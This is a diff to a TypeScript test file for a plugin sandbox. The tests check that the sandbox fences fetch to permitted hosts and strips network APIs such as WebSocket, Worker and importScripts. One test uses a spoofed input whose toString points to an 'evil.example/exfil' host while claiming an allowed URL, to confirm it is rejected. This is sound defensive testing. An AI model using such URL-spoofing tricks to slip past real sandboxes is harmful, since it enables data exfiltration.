@@ -10,12 +10,21 @@ import type { HostMessage, WorkerMessage } from "./protocol";
  */
 function bootWorker(fetchImpl: typeof fetch = vi.fn()) {
   const posted: WorkerMessage[] = [];
-  const fakeGlobal: Record<string, unknown> = {
-    fetch: fetchImpl,
+  // Workers expose fetch and importScripts as own properties of the global;
+  // the fake keeps them on a prototype instead so the fence's prototype walk
+  // (defence in depth for engines that differ) is exercised too.
+  const scopePrototype: Record<string, unknown> = { fetch: fetchImpl, importScripts: vi.fn() };
+  const fakeGlobal: Record<string, unknown> = Object.assign(Object.create(scopePrototype), {
+    XMLHttpRequest: vi.fn(),
+    WebSocket: vi.fn(),
+    EventSource: vi.fn(),
+    Worker: vi.fn(),
+    SharedWorker: vi.fn(),
+    caches: {},
     // new Function code has no dynamic-import callback under vitest's VM, so
     // hand the bootstrap this module's importer instead.
     __glyphSandboxImport: (url: string) => import(/* @vite-ignore */ url),
-  };
+  });
   const run = new Function(
     "postMessage",
     "globalThis",
@@ -27,6 +36,7 @@ function bootWorker(fetchImpl: typeof fetch = vi.fn()) {
   return {
     posted,
     fakeGlobal,
+    scopePrototype,
     send: (data: HostMessage) => handler({ data }),
     typesPosted: () => posted.map((m) => m.type),
   };
@@ -292,10 +302,48 @@ describe("worker bootstrap", () => {
     await expect(fenced("https://api.example.com/data")).resolves.toBe("response");
     await expect(fenced(new Request("https://example.com/"))).resolves.toBe("response");
     await expect(fenced("https://evil.com/")).rejects.toThrow("not covered");
-    await expect(fenced("garbage")).rejects.toThrow("not covered");
-    expect(w.fakeGlobal.XMLHttpRequest).toBeUndefined();
-    expect(w.fakeGlobal.WebSocket).toBeUndefined();
-    expect(w.fakeGlobal.importScripts).toBeUndefined();
+    await expect(fenced("garbage")).rejects.toThrow();
+    for (const name of [
+      "XMLHttpRequest",
+      "WebSocket",
+      "EventSource",
+      "Worker",
+      "SharedWorker",
+      "importScripts",
+      "caches",
+    ]) {
+      expect(w.fakeGlobal[name], name).toBeUndefined();
+    }
+    // The prototype copies are fenced too, and nothing can be swapped back.
+    expect(w.scopePrototype.fetch).toBe(fenced);
+    expect(w.scopePrototype.importScripts).toBeUndefined();
+    expect(() => {
+      w.fakeGlobal.fetch = realFetch;
+    }).toThrow(TypeError);
+    expect(() => {
+      w.fakeGlobal.Worker = vi.fn();
+    }).toThrow(TypeError);
+  });
+
+  it("reads the host off a normalized Request, so a lying input cannot slip past", async () => {
+    const realFetch = vi.fn().mockResolvedValue("response");
+    const w = bootWorker(realFetch as unknown as typeof fetch);
+    await w.send(init("export default { activate(){} }", { permissions: ["network:example.com"] }));
+    await vi.waitFor(() => expect(w.typesPosted()).toContain("activated"));
+
+    const fenced = w.fakeGlobal.fetch as typeof fetch;
+    // fetch stringifies a non-Request input, so this object would have been
+    // sent to evil.example while its `url` claimed the allowed host.
+    const liar = { url: "https://example.com/", toString: () => "https://evil.example/exfil" };
+    await expect(fenced(liar as unknown as string)).rejects.toThrow("not covered");
+    expect(realFetch).not.toHaveBeenCalled();
+    // A Request subclass overriding `url` is the other shape; browsers copy a
+    // Request input's internal URL, but happy-dom reads the public getter, so
+    // that case cannot be exercised here.
+
+    await expect(fenced(new URL("https://api.example.com/x"))).resolves.toBe("response");
+    const sent = realFetch.mock.calls[0][0] as Request;
+    expect(sent.url).toBe("https://api.example.com/x");
   });
 
   it("denies all network access when no network permission is declared", async () => {
